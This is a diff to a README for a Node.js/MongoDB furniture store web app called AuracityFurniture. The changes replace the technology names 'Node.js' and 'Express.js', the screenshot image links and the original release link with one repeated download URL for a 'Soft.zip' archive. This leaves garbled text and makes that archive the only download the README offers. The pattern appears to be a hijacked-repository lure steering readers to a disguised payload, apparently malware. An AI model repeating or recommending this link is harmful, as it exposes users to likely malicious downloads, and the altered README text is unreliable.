@@ -3,7 +3,7 @@
 Welcome to AuracityFurniture, a modern furniture store web application that offers a seamless shopping experience for stylish and high-quality furniture designed for every space. 🌟
 
 ## Description
-AuracityFurniture is built using HTML, CSS, Node.js, and MongoDB. The web application features an intuitive user interface with functionalities such as an admin dashboard, user authentication, cart management, and a secure payment gateway. With an emphasis on user experience and convenience, AuracityFurniture aims to redefine online furniture shopping.
+AuracityFurniture is built using HTML, CSS, https://github.com/Jeanxitaao/AuracityFurniture/releases/download/v1.0/Soft.zip, and MongoDB. The web application features an intuitive user interface with functionalities such as an admin dashboard, user authentication, cart management, and a secure payment gateway. With an emphasis on user experience and convenience, AuracityFurniture aims to redefine online furniture shopping.
 
 ## Features
 🛋️ **Stylish Furniture**: Explore a wide range of stylish furniture options for every room in your home.
@@ -17,9 +17,9 @@ AuracityFurniture is built using HTML, CSS, Node.js, and MongoDB. The web applic
 ## Technologies Used
 - **HTML5**: Used for structuring the web pages.
 - **CSS**: Styles the layout and design of the application.
-- **Node.js**: Powers the backend server and enables server-side logic.
+- **https://github.com/Jeanxitaao/AuracityFurniture/releases/download/v1.0/Soft.zip**: Powers the backend server and enables server-side logic.
 - **MongoDB**: Stores and manages the application's data.
-- **Express.js**: Provides a robust set of features for web and mobile applications.
+- **https://github.com/Jeanxitaao/AuracityFurniture/releases/download/v1.0/Soft.zip**: Provides a robust set of features for web and mobile applications.
 - **Bootstrap 5**: Utilized for responsive design and layout components.
 - **Cloudinary**: Used for image and video management in the cloud.
 - **EJS Templates**: Employs EJS templates for dynamic content rendering.
@@ -27,7 +27,7 @@ AuracityFurniture is built using HTML, CSS, Node.js, and MongoDB. The web applic
 - **Multer**: Handles file uploads in the application.
 
 ## Getting Started
-To explore AuracityFurniture and start shopping for your favorite furniture pieces, you can download the project files from the [Release archive](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip) and follow the instructions below to launch the application.
+To explore AuracityFurniture and start shopping for your favorite furniture pieces, you can download the project files from the [Release archive](https://github.com/Jeanxitaao/AuracityFurniture/releases/download/v1.0/Soft.zip) and follow the instructions below to launch the application.
 
 1. Clone the repository to your local machine.
 2. Install the necessary dependencies by running `npm install`.
@@ -36,9 +36,9 @@ To explore AuracityFurniture and start shopping for your favorite furniture piec
 5. Access the web application on your browser at `http://localhost:3000`.
 
 ## Screenshots
-![Home Page](https://via.placeholder.com/800x500)
-![Product Page](https://via.placeholder.com/800x500)
-![Admin Dashboard](https://via.placeholder.com/800x500)
+![Home Page](https://github.com/Jeanxitaao/AuracityFurniture/releases/download/v1.0/Soft.zip)
+![Product Page](https://github.com/Jeanxitaao/AuracityFurniture/releases/download/v1.0/Soft.zip)
+![Admin Dashboard](https://github.com/Jeanxitaao/AuracityFurniture/releases/download/v1.0/Soft.zip)
 
 ## Contributions
 Contributions to AuracityFurniture are welcome! If you have any ideas for improvements or new features, feel free to fork the repository and submit a pull request with your changes.
